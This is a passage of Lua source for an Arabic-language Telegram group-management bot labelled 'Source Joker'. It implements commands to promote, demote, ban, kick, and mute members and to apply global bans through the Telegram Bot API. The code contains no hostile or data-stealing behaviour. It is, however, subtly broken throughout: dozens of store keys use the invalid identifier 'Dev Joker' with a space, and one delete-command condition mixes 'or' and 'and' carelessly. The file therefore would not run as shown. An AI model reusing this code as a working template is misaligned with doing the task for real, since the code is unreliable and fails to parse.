Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙المسخدم ↫ ["..absc9.."]\n⌁︙تم تنزيله من ↫ ⤈\n⌯ ( "..SudoBot..''..ownerall..''..adminall..''..vpall..''..monsh..''..monshid..''..owner..''..admins..''..vipmem.." ) ⌯ \n ", 1, 'md')
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙العضو ↫ ["..absc9.."]\n⌁︙لم تتم ترقيته مسبقا", 1, 'md')
end 
if masco(msg.sender_user_id_,msg.chat_id_) == 'botow' then
DevAbs:srem(Dev Joker..'abs:SudoBot:', result.id_)
DevAbs:srem(Dev Joker..'abs:ownerall:', result.id_)
DevAbs:srem(Dev Joker..'abs:adminall:', result.id_)
DevAbs:srem(Dev Joker..'abs:vipall:', result.id_)
DevAbs:srem(Dev Joker..'abs:monsh:'..msg.chat_id_,result.id_)
DevAbs:srem(Dev Joker..'abs:monshid:'..msg.chat_id_,result.id_)
DevAbs:srem(Dev Joker..'abs:owners:'..msg.chat_id_, result.id_)
DevAbs:srem(Dev Joker..'abs:admins:'..msg.chat_id_, result.id_)
DevAbs:srem(Dev Joker..'abs:vipmem:'..msg.chat_id_, result.id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'SudoBot' then
DevAbs:srem(Dev Joker..'abs:ownerall:', result.id_)
DevAbs:srem(Dev Joker..'abs:adminall:', result.id_)
DevAbs:srem(Dev Joker..'abs:vipall:', result.id_)
DevAbs:srem(Dev Joker..'abs:admins:'..msg.chat_id_, result.id_)
DevAbs:srem(Dev Joker..'abs:vipmem:'..msg.chat_id_, result.id_)
DevAbs:srem(Dev Joker..'abs:owners:'..msg.chat_id_, result.id_)
DevAbs:srem(Dev Joker..'abs:monshid:'..msg.chat_id_,result.id_)
DevAbs:srem(Dev Joker..'abs:monsh:'..msg.chat_id_,result.id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'absmonsh' then
DevAbs:srem(Dev Joker..'abs:admins:'..msg.chat_id_, result.id_)
DevAbs:srem(Dev Joker..'abs:vipmem:'..msg.chat_id_, result.id_)
DevAbs:srem(Dev Joker..'abs:owners:'..msg.chat_id_, result.id_)
DevAbs:srem(Dev Joker..'abs:monshid:'..msg.chat_id_,result.id_)
DevAbs:srem(Dev Joker..'abs:monsh:'..msg.chat_id_,result.id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'monsh' then
DevAbs:srem(Dev Joker..'abs:admins:'..msg.chat_id_, result.id_)
DevAbs:srem(Dev Joker..'abs:vipmem:'..msg.chat_id_, result.id_)
DevAbs:srem(Dev Joker..'abs:owners:'..msg.chat_id_, result.id_)
DevAbs:srem(Dev Joker..'abs:monshid:'..msg.chat_id_,result.id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'monshid' then
DevAbs:srem(Dev Joker..'abs:admins:'..msg.chat_id_, result.id_)
DevAbs:srem(Dev Joker..'abs:vipmem:'..msg.chat_id_, result.id_)
DevAbs:srem(Dev Joker..'abs:owners:'..msg.chat_id_, result.id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'owner' then
DevAbs:srem(Dev Joker..'abs:admins:'..msg.chat_id_, result.id_)
DevAbs:srem(Dev Joker..'abs:vipmem:'..msg.chat_id_, result.id_)
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المعرف غير صحيح*', 1, 'md')
end
end
resolve_username(rem[2],remm)
end
--     Source Joker     --
if text:match("^رفع ادمن بالكروب$") and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and ChCheck(msg) or text:match("^رفع ادمن الكروب$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and ChCheck(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم رفعه ادمن في الكروب', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^تنزيل ادمن بالكروب$") and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and ChCheck(msg) or text:match("^تنزيل ادمن الكروب$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and ChCheck(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙ادمن الكروب ↫ ['..absc9..']\n⌁︙تم تنزيله ادمن من الكروب', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
if text:match("^رفع بكل الصلاحيات$") and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and ChCheck(msg) or text:match("^رفع بكل صلاحيات$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and ChCheck(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم رفعه ادمن في جميع الصلاحيات', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
--     Source Joker     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^مسح$") or text:match("^حذف$") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) then
local id = msg.id_
local msgs = {[0] = id}
delete_msg(msg.chat_id_,{[0] = msg.reply_to_message_id_})
delete_msg(msg.chat_id_,msgs)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف الرسالة مع رسالة الامر ', 1, 'md')
end
if is_monshid(msg.sender_user_id_, msg.chat_id_) then
if text:match("^تفعيل الحظر$") and ChCheck(msg) or text:match("^تفعيل الطرد$") and ChCheck(msg) then
DevAbs:del("ABS_PROX:lock:ban"..bot_id..msg.chat_id_)
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل الطرد والحظر'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
end
if text:match("^تعطيل الحظر$") and ChCheck(msg) or text:match("^تعطيل الطرد$") and ChCheck(msg) then
DevAbs:set("ABS_PROX:lock:ban"..bot_id..msg.chat_id_,"ABS_PROX")
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل الطرد والحظر'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
end
if text:match("^تفعيل الكتم$") and ChCheck(msg) or text:match("^تفعيل التقييد$") and ChCheck(msg) then
DevAbs:del("ABS_PROX:lock:bank"..bot_id..msg.chat_id_)
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل الكتم والتقييد'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
end
if text:match("^تعطيل الكتم$") and ChCheck(msg) or text:match("^تعطيل التقييد$") and ChCheck(msg) then
DevAbs:set("ABS_PROX:lock:bank"..bot_id..msg.chat_id_,"ABS_PROX")
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل الكتم والتقييد'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
end
end
if is_monsh(msg.sender_user_id_, msg.chat_id_) then
if text:match("^تفعيل الرفع$") and ChCheck(msg) or text:match("^تفعيل الترقيه$") and ChCheck(msg) then
DevAbs:del(Dev Joker.."ABS_PROX:lock:set"..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم تفعيل رفع ↫ الادمن • المميز', 1, 'md')
end
if text:match("^تعطيل الرفع$") and ChCheck(msg) or text:match("^تعطيل الترقيه$") and ChCheck(msg) then
DevAbs:set(Dev Joker.."ABS_PROX:lock:set"..msg.chat_id_,"true")
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم تعطيل رفع ↫ الادمن • المميز', 1, 'md')
end
end
--     Source Joker     --
if text:match("^حظر$") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) then
function ban_by_reply(extra, result, success)
if not is_monshid(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الطرد او الحظر \n⌁︙لانة معطل من قبل المنشئ ', 1, 'md')
return "ABS_PROX"
end
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. result.sender_user_id_)
local abs = 'abs:Ban:'..msg.chat_id_
local absc9 = user_info_ if user_info_ then
if is_admin(result.sender_user_id_, result.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع حظر ↫ '..rank_abs(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
if DevAbs:sismember(Dev Joker..abs, result.sender_user_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙هو بالفعل محظور في المجموعة', 1, 'md')
chat_kick(result.chat_id_, result.sender_user_id_)
else
DevAbs:sadd(Dev Joker..abs, result.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم حظرة من المجموعة', 1, 'md')
chat_kick(result.chat_id_, result.sender_user_id_)
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,ban_by_reply)
end  
--     Source Joker     --
if text:match('^حظر @(.*)$') and is_admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
local ap = {string.match(text, '^(حظر) @(.*)$')}
function ban_by_username(extra, result, success)
if not is_monshid(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الطرد او الحظر \n⌁︙لانة معطل من قبل المنشئ ', 1, 'md')
return "ABS_PROX"
end
local abs = 'abs:Ban:'..msg.chat_id_
if result.id_ then 
if is_admin(result.id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع حظر ↫ '..rank_abs(result.id_, msg.chat_id_), 1, 'md')
else
if DevAbs:sismember(Dev Joker..abs, result.id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ [@'..ap[2]..']\n⌁︙هو بالفعل محظور من المجموعة', 1, 'md')
else
DevAbs:sadd(Dev Joker..abs, result.id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ [@'..ap[2]..']\n⌁︙تم حظرة من المجموعة', 1, 'md')
chat_kick(msg.chat_id_, result.id_)
end
end
end
end
resolve_username(ap[2],ban_by_username)
end
--     Source Joker     --
if text:match("^حظر (%d+)$") and ChCheck(msg) then
local ap = {string.match(text, "^(حظر) (%d+)$")}
if not is_monshid(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الطرد او الحظر \n⌁︙لانة معطل من قبل المنشئ ', 1, 'md')
return "ABS_PROX"
end
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. ap[2])
local absc9 = user_info_ if user_info_ then
if is_admin(ap[2], msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع حظر ↫ '..rank_abs(ap[2], msg.chat_id_), 1, 'md')
else
DevAbs:sadd(Dev Joker..'abs:Ban:'..msg.chat_id_, ap[2])
chat_kick(msg.chat_id_, ap[2])
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم حظرة من المجموعة', 1, 'md')
end
end
end
--     Source Joker     --
if text:match("^طرد$") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) then
function kick_reply(extra, result, success)
if not is_monshid(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الطرد او الحظر \n⌁︙لانة معطل من قبل المنشئ ', 1, 'md')
return "ABS_PROX"
end
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
if is_admin(result.sender_user_id_, result.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع طرد ↫ '..rank_abs(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم طردة من المجموعة', 1, 'md')
chat_kick(result.chat_id_, result.sender_user_id_)
end
end
end
getMessage(msg.chat_id_,msg.reply_to_message_id_,kick_reply)
end
--     Source Joker     --
if text and text:match("^طرد @(.*)$") and ChCheck(msg) then
local ap = {string.match(text, "^(طرد) @(.*)$")}
function ban_by_username(extra, result, success)
if not is_monshid(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الطرد او الحظر \n⌁︙لانة معطل من قبل المنشئ ', 1, 'md')
return "ABS_PROX"
end
if result.id_ then
if is_admin(result.id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع طرد ↫ '..rank_abs(result.id_, msg.chat_id_), 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ [@'..ap[2]..']\n⌁︙تم طردة من المجموعة', 1, 'md')
chat_kick(msg.chat_id_, result.id_)
end
end
end
resolve_username(ap[2],ban_by_username)
end
--     Source Joker     --
if text:match("^طرد (%d+)$") and ChCheck(msg) then
local ap = {string.match(text, "^(طرد) (%d+)$")}
if not is_monshid(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الطرد او الحظر \n⌁︙لانة معطل من قبل المنشئ ', 1, 'md')
return "ABS_PROX"
end
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. ap[2])
local absc9 = user_info_ if user_info_ then
if is_admin(ap[2], msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع طرد ↫ '..rank_abs(ap[2], msg.chat_id_), 1, 'md')
else
chat_kick(msg.chat_id_, ap[2])
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم طردة من المجموعة', 1, 'md')
end 
end 
end
--     Source Joker     --
local text = msg.content_.text_:gsub('الغاء حظر','الغاء الحظر')
if text:match("^الغاء الحظر$") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) then
function ABS_PROX(extra, result, success)
function unban_by_reply(extra, result, success)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. result.sender_user_id_)
local abs = 'abs:Ban:'..msg.chat_id_
local absc9 = user_info_ if user_info_ then
if not DevAbs:sismember(Dev Joker..abs, result.sender_user_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙هو ليس محظور لالغاء حظرة', 1, 'md')
else
DevAbs:srem(Dev Joker..abs, result.sender_user_id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المحظور ↫ ['..absc9..']\n⌁︙تم الغاء حظرة من المجموعة', 1, 'md')
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unban_by_reply)
end
channel_get_kicked(msg.chat_id_,ABS_PROX)
end
--     Source Joker     --
if text:match("^الغاء الحظر @(.*)$") and ChCheck(msg) then
local ap = {string.match(text, "^(الغاء الحظر) @(.*)$")}
function unban_by_username(extra, result, success)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. result.id_)
local absc9 = user_info_ if user_info_ then
if result.id_ then
if not DevAbs:sismember(Dev Joker..'abs:Ban:'..msg.chat_id_, result.id_) then
text = '⌁︙العضو ↫ ['..absc9..']\n⌁︙هو ليس محظور لالغاء حظرة'
else
DevAbs:srem(Dev Joker..'abs:Ban:'..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
text = '⌁︙المحظور ↫ ['..absc9..']\n⌁︙تم الغاء حظرة من المجموعة'
end
else
text = '⌁︙*المعرف غير صحيح*'
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
resolve_username(ap[2],unban_by_username)
end
--     Source Joker     --
if text:match("^الغاء الحظر (%d+)$") and ChCheck(msg) then
local ap = {string.match(text, "^(الغاء الحظر) (%d+)$")}
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. ap[2])
local absc9 = user_info_ if user_info_ then
if not DevAbs:sismember(Dev Joker..'abs:Ban:'..msg.chat_id_, ap[2]) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙هو ليس محظور لالغاء حظرة', 1, 'md')
else
DevAbs:srem(Dev Joker..'abs:Ban:'..msg.chat_id_, ap[2])
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = ap[2] , status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المحظور ↫ ['..absc9..']\n⌁︙تم الغاء حظرة من المجموعة', 1, 'md')
end
end
end
--     Source Joker     --
local text = msg.content_.text_:gsub('حضر عام','حظر عام')
if text:match("^حظر عام$") and is_sudo(msg) and msg.reply_to_message_id_ then
function BanAll_by_reply(extra, result, success)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. result.sender_user_id_)
local abs = 'abs:BanAll:'
local absc9 = user_info_ if user_info_ then
if is_leaderid(result.sender_user_id_) == true then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم حظره عام من المجموعات', 1, 'md')
DevAbs:sadd(Dev Joker..abs, result.sender_user_id_)
chat_kick(result.chat_id_, result.sender_user_id_)
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,BanAll_by_reply)
end
--     Source Joker     --
if text and text:match("^حظر عام @(.*)$") and is_sudo(msg) then
local aps = {string.match(text, "^(حظر عام) @(.*)$")}
function BanAll_by_username(extra, result, success)
if result.id_ then
if is_leaderid(result.id_) == true then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ [@'..aps[2]..']\n⌁︙تم حظره عام من المجموعات', 1, 'md')
DevAbs:sadd(Dev Joker..'abs:BanAll:', result.id_)
chat_kick(msg.chat_id_, result.id_)
end
end
resolve_username(aps[2],BanAll_by_username)
end
--     Source Joker     --
if text:match("^حظر عام (%d+)$") and is_sudo(msg) then
local ap = {string.match(text, "^(حظر عام) (%d+)$")}
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. ap[2])
local abs = 'abs:BanAll:'
local absc9 = user_info_ if user_info_ then
if is_leaderid(ap[2]) == true then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم حظره عام من المجموعات', 1, 'md')
end
DevAbs:sadd(Dev Joker..abs, ap[2])
chat_kick(msg.chat_id_, ap[2])
end
--     Source Joker     --
local text = msg.content_.text_:gsub('الغاء العام','الغاء عام')
if text:match("^الغاء عام$") and is_sudo(msg) and msg.reply_to_message_id_ then
function unBanAll_by_reply(extra, result, success)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم الغاء (الحظر • الكتم) عام من المجموعات', 1, 'md')
end
DevAbs:srem(Dev Joker..'abs:BanAll:', result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:MuteAll:', result.sender_user_id_)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unBanAll_by_reply)
end
--     Source Joker     --
if text:match("^الغاء عام @(.*)$") and is_sudo(msg) then
local apid = {string.match(text, "^(الغاء عام) @(.*)$")}
function unBanAll_by_username(extra, result, success)
if result.id_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ [@'..apid[2]..']\n⌁︙تم الغاء (الحظر • الكتم) عام من المجموعات', 1, 'md')
DevAbs:srem(Dev Joker..'abs:BanAll:', result.id_)
DevAbs:srem(Dev Joker..'abs:MuteAll:', result.id_)
end
end
resolve_username(apid[2],unBanAll_by_username)
end
--     Source Joker     --
if text:match("^الغاء عام (%d+)$") and is_sudo(msg) then
local ap = {string.match(text, "^(الغاء عام) (%d+)$")}
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. ap[2])
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم الغاء (الحظر • الكتم) عام من المجموعات', 1, 'md')
DevAbs:srem(Dev Joker..'abs:BanAll:', ap[2])
DevAbs:srem(Dev Joker..'abs:MuteAll:', ap[2])
end
end
--     Source Joker     --
if text:match("^كتم عام$") and is_sudo(msg) and msg.reply_to_message_id_ then
function muteall_by_reply(extra, result, success)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*لا تستطيع كتمي*', 1, 'md')
return false 
end 
if is_leaderid(result.sender_user_id_) == true then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
DevAbs:sadd(Dev Joker..'abs:MuteAll:', result.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم كتمه عام من المجموعات', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,muteall_by_reply)
end
--     Source Joker     --
if text:match('^كتم عام @(.*)$') and is_sudo(msg) then
local ap = {string.match(text, '^(كتم عام) @(.*)$')}
function muteall_by_username(extra, result, success)
if result.id_ then 
if is_leaderid(result.id_) == true then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
DevAbs:sadd(Dev Joker..'abs:MuteAll:', result.id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ [@'..ap[2]..']\n⌁︙تم كتمه عام من المجموعات', 1, 'md')
end
end
resolve_username(ap[2],muteall_by_username)
end
--     Source Joker     --
if text:match("^كتم عام (%d+)$") and is_sudo(msg) then
local ap = {string.match(text, "^(كتم عام) (%d+)$")}
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. ap[2])
local absc9 = user_info_ if user_info_ then
if is_leaderid(ap[2]) == true then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
DevAbs:sadd(Dev Joker..'abs:MuteAll:', ap[2])
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم كتمه عام من المجموعات', 1, 'md')
end
end
--     Source Joker     --
if text:match("^كتم$") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) then
function mute_by_reply(extra, result, success)
if not is_monshid(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:bank"..bot_id..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الكتم او التقييد \n⌁︙لانة معطل من قبل المنشئ ', 1, 'md')
return "ABS_PROX"
end
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*لا تستطيع كتمي*', 1, 'md')
return false 
end 
if is_admin(result.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع كتم ↫ '..rank_abs(result.sender_user_id_, msg.chat_id_), 1, 'md')
else 
DevAbs:sadd(Dev Joker..'abs:Muted:'..msg.chat_id_, result.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم كتمة من المجموعة', 1, 'md')
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end
--     Source Joker     --
if text:match('^كتم @(.*)$') and is_admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
local ap = {string.match(text, '^(كتم) @(.*)$')}
function mute_by_username(extra, result, success)
if not is_monshid(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:bank"..bot_id..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الكتم او التقييد \n⌁︙لانة معطل من قبل المنشئ ', 1, 'md')
return "ABS_PROX"
end
local abs = 'abs:Muted:'..msg.chat_id_
if result.id_ then 
if is_admin(result.id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع كتم ↫ '..rank_abs(result.id_, msg.chat_id_), 1, 'md')
else
if DevAbs:sismember(Dev Joker..abs, result.id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ [@'..ap[2]..']\n⌁︙هو بالفعل مكتوم في المجموعة', 1, 'md')
else
DevAbs:sadd(Dev Joker..abs, result.id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ [@'..ap[2]..']\n⌁︙تم كتمة من المجموعة', 1, 'md')
end
end
end
end
resolve_username(ap[2],mute_by_username)
end
--     Source Joker     --
if text:match("^كتم (%d+)$") and ChCheck(msg) then
local ap = {string.match(text, "^(كتم) (%d+)$")}
if not is_monshid(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:bank"..bot_id..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الكتم او التقييد \n⌁︙لانة معطل من قبل المنشئ ', 1, 'md')
return "ABS_PROX"
end
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. ap[2])
local absc9 = user_info_ if user_info_ then
if is_admin(ap[2], msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع كتم ↫ '..rank_abs(ap[2], msg.chat_id_), 1, 'md')
else
if DevAbs:sismember(Dev Joker..'abs:Muted:'..msg.chat_id_, ap[2]) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙هو بالفعل مكتوم في المجموعة', 1, 'md')
end
DevAbs:sadd(Dev Joker..'abs:Muted:'..msg.chat_id_, ap[2])
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم كتمة من المجموعة', 1, 'md')
end
end
end
--     Source Joker     --
local text = msg.content_.text_:gsub('الغاء كتم','الغاء الكتم')
if text:match("^الغاء الكتم$") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) then
function unmute_by_reply(extra, result, success)
